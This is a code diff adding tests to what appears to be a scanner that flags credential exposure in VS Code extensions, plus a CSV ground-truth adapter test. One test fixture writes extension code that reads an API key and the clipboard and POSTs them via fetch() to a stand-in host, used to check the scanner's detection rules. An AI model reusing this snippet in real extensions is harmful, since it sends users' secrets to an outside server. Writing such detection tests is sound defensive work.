@@ -8,6 +8,7 @@ from pathlib import Path
 from tempfile import TemporaryDirectory
 from unittest.mock import patch
 
+from ide_scanner.benchmarks.adapters.protect_your_secrets import normalize_ground_truth_csv
 from ide_scanner.discovery import discover_from_path
 from ide_scanner.cli import _run_benchmark
 from ide_scanner.posture import scan_posture, summarize_posture
@@ -183,6 +184,79 @@ class ScannerTests(unittest.TestCase):
         self.assertEqual(row["verdict_state"], "safe_with_notes")
         self.assertEqual(row["verdict_label"], "Safe with notes")
         self.assertGreater(row["context_score"], 0)
+
+    def test_cross_extension_credential_exposure_findings(self) -> None:
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            (root / "package.json").write_text(
+                json.dumps({
+                    "publisher": "example",
+                    "name": "credential-surfaces",
+                    "version": "1.0.0",
+                    "main": "extension.js",
+                    "contributes": {
+                        "configuration": {
+                            "properties": {
+                                "example.openaiApiKey": {
+                                    "type": "string",
+                                    "description": "OpenAI API key for requests",
+                                }
+                            }
+                        },
+                        "commands": [{
+                            "command": "example.setApiToken",
+                            "title": "Set API token",
+                        }],
+                    },
+                }),
+                encoding="utf-8",
+            )
+            (root / "extension.js").write_text(
+                "const vscode = require('vscode');\n"
+                "async function activate(context) {\n"
+                " const key = await vscode.window.showInputBox({ prompt: 'Enter OpenAI API key' });\n"
+                " await context.globalState.update('openaiApiKey', key);\n"
+                " const clip = await vscode.env.clipboard.readText();\n"
+                " await fetch('https://api.example.com/token', { method: 'POST', body: key || clip });\n"
+                " vscode.commands.registerCommand('example.rotateApiToken', () => key);\n"
+                "}\n",
+                encoding="utf-8",
+            )
+
+            report = scan_extension(root)
+
+        rule_ids = {finding.rule_id for finding in report.findings}
+        self.assertIn("credential-config-key", rule_ids)
+        self.assertIn("credential-command-registration", rule_ids)
+        self.assertIn("credential-inputbox-prompt", rule_ids)
+        self.assertIn("credential-global-state-storage", rule_ids)
+        self.assertIn("clipboard-read-near-secret-input", rule_ids)
+        self.assertIn("credential-dataflow-to-network", rule_ids)
+        self.assertEqual(report.verdict, "suspicious")
+        self.assertEqual(report.score_details["basis"], "cross_extension_exposure")
+        self.assertGreaterEqual(report.risk_score, 90)
+
+    def test_protect_your_secrets_csv_adapter_normalizes_labels(self) -> None:
+        with TemporaryDirectory() as tmp:
+            source = Path(tmp) / "Ground_Truth_datasets.csv"
+            source.write_text(
+                "\ufeffextensionID,install,type,is_vulnerable,data\n"
+                "pub.secret,123,RequestedConfiguration,Credential,openai.apiKey\n"
+                "pub.secret,123,InputBox,Credential,Enter API token\n"
+                "pub.pii,5,GlobalState,PII,email\n"
+                "pub.clean,9,Commands,Other,format document\n",
+                encoding="utf-8",
+            )
+
+            dataset = normalize_ground_truth_csv(source)
+
+        by_id = {item["extension_id"]: item for item in dataset["extensions"]}
+        self.assertEqual(dataset["credential_data_points"], 2)
+        self.assertEqual(dataset["credential_extension_count"], 1)
+        self.assertEqual(by_id["pub.secret"]["label"], "credential_exposure")
+        self.assertEqual(by_id["pub.secret"]["expected_findings"], ["credential-config-key", "credential-inputbox-prompt"])
+        self.assertEqual(by_id["pub.pii"]["label"], "pii_exposure")
+        self.assertEqual(by_id["pub.clean"]["label"], "non_credential")
 
     def test_compiled_out_directory_is_scanned(self) -> None:
         with TemporaryDirectory() as tmp:
